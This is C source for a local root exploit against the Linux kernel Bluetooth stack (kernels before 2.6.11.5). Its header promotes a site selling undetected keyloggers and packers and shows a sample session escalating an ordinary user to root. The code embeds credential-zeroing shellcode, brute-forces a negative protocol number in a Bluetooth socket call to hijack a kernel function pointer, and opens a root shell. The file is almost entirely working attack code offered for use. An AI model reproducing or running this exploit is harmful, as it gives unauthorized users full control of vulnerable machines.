/* LINUX KERNEL &lt; 2.6.11.5 BLUETOOTH STACK LOCAL ROOT EXPLOIT
*
* 19 October 2005

http://backdoored.net
Visit us for Undetected keyloggers and packers.Thanx


h4x0r bluetooth $ id
uid=1000(addicted) gid=100(users) groups=100(users)
h4x0r bluetooth $

h4x0r bluetooth $ ./backdoored-bluetooth
KERNEL Oops. Exit Code = 11.(Segmentation fault)
KERNEL Oops. Exit Code = 11.(Segmentation fault)
KERNEL Oops. Exit Code = 11.(Segmentation fault)
KERNEL Oops. Exit Code = 11.(Segmentation fault)
KERNEL Oops. Exit Code = 11.(Segmentation fault)
Checking the Effective user id after overflow : UID = 0
h4x0r bluetooth # id
uid=0(root) gid=0(root) groups=100(users)
h4x0r bluetooth #

h4x0r bluetooth # dmesg
PREEMPT SMP
Modules linked in:
CPU: 0
EIP: 0060:[&lt;c0405ead&gt;] Not tainted VLI
EFLAGS: 00010286 (2.6.9)
EIP is at bt_sock_create+0x3d/0x130
eax: ffffffff ebx: ffebfe34 ecx: 00000000 edx: c051bea0
esi: ffffffa3 edi: ffffff9f ebp: 00000001 esp: c6729f1c
ds: 007b es: 007b ss: 0068
Process backdoored-bluetooth (pid: 8809, threadinfo=c6729000 
task=c6728a20)
Stack: cef24e00 0000001f 0000001f c6581680 ffffff9f c039a3bb c6581680 
ffebfe34
00000001 b8000c80 bffff944 c6729000 c039a58d 0000001f 00000003 ffebfe34
c6729f78 00000000 c039a60b 0000001f 00000003 ffebfe34 c6729f78 b8000c80
Call Trace:
[&lt;c039a3bb&gt;] __sock_create+0xfb/0x2a0
[&lt;c039a58d&gt;] sock_create+0x2d/0x40
[&lt;c039a60b&gt;] sys_socket+0x2b/0x60
[&lt;c039b4e8&gt;] sys_socketcall+0x68/0x260
[&lt;c0117a9c&gt;] finish_task_switch+0x3c/0x90
[&lt;c0117b07&gt;] schedule_tail+0x17/0x50
[&lt;c0115410&gt;] do_page_fault+0x0/0x5e9
[&lt;c01031af&gt;] syscall_call+0x7/0xb
Code: 24 0c 89 7c 24 10 83 fb 07 0f 8f b1 00 00 00 8b 04 9d 60 a4 5d c0 
85 c0 0f 84 d7 00 00 00 85 c0 be a3 ff ff ff 0f 84 93 00 00 00 
&lt;8b&gt; 50 10 bf 01 00 00 00
85 d2 74 37 b8 00 f0 ff ff 21 e0 ff 40

*/


#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
#include &lt;limits.h&gt;
#include &lt;signal.h&gt;
#include &lt;sys/wait.h&gt;

#define KERNEL_SPACE_MEMORY_BRUTE_START 0xc0000000
#define KERNEL_SPACE_MEMORY_BRUTE_END 0xffffffff
#define KERNEL_SPACE_BUFFER 0x100000


char asmcode[] = /*Global shellcode*/

&quot;xb8x00xf0xffxffx31xc9x21xe0x8bx10x89x8a&quot;
&quot;x80x01x00x00x31xc9x89x8ax7cx01x00x00x8b&quot;
&quot;x00x31xc9x31xd2x89x88x90x01x00x00x89x90&quot;
&quot;x8cx01x00x00xb8xffxffxffxffxc3&quot;;



struct net_proto_family {
int family;
int (*create) (int *sock, int protocol);
short authentication;
short encryption;
short encrypt_net;
int *owner;
};


int check_zombie_child(int status,pid_t pid)
{
waitpid(pid,&amp;status,0);
if(WIFEXITED(status))
{
if(WEXITSTATUS(status) != 0xFF)
exit(-1);
}
else if (WIFSIGNALED(status))
{
printf(&quot;KERNEL Oops. Exit Code = %d.(%s) 
&quot;,WTERMSIG(status),strsignal(WTERMSIG(status)));
return(WTERMSIG(status));
}
}


int brute_socket_create (int negative_proto_number)
{
socket(AF_BLUETOOTH,SOCK_RAW, negative_proto_number); /* overflowing 
proto number with negative 32bit value */
int i;
i = geteuid();
printf(&quot;Checking the Effective user id after overflow : UID = %d 
&quot;,i);
if(i)
exit(EXIT_FAILURE);
printf(&quot;0wnage D0ne bro. &quot;);
execl(&quot;/bin/sh&quot;,&quot;sh&quot;,NULL);
exit(EXIT_SUCCESS);
}


int main(void)
{

pid_t pid;
int counter;
int status;
int *kernel_return;

char kernel_buffer[KERNEL_SPACE_BUFFER];
unsigned int brute_start;
unsigned int where_kernel;

struct net_proto_family *bluetooth;

bluetooth = (struct net_proto_family *) malloc(sizeof(struct 
net_proto_family));
bzero(bluetooth,sizeof(struct net_proto_family));

bluetooth-&gt;family = AF_BLUETOOTH;
bluetooth-&gt;authentication = 0x0; /* No Authentication */
bluetooth-&gt;encryption = 0x0; /* No Encryption */
bluetooth-&gt;encrypt_net = 0x0; /* No Encrypt_net */
bluetooth-&gt;owner = 0x0; /* No fucking owner */
bluetooth-&gt;create = (int *) asmcode;



kernel_return = (int *) kernel_buffer;

for( counter = 0; counter &lt; KERNEL_SPACE_BUFFER; counter+=4, 
kernel_return++)
*kernel_return = (int)bluetooth;

brute_start = KERNEL_SPACE_MEMORY_BRUTE_START;
printf(&quot;Bluetooth stack local root exploit &quot;);
printf(&quot;http://backdoored/net&quot;);

while ( brute_start &lt; KERNEL_SPACE_MEMORY_BRUTE_END )
{
where_kernel = (brute_start - (unsigned int)&amp;kernel_buffer) / 0x4 ;
where_kernel = -where_kernel;

pid = fork();
if(pid == 0 )
brute_socket_create(where_kernel);
check_zombie_child(status,pid);
brute_start += KERNEL_SPACE_BUFFER;
fflush(stdout);
}
return 0;
}
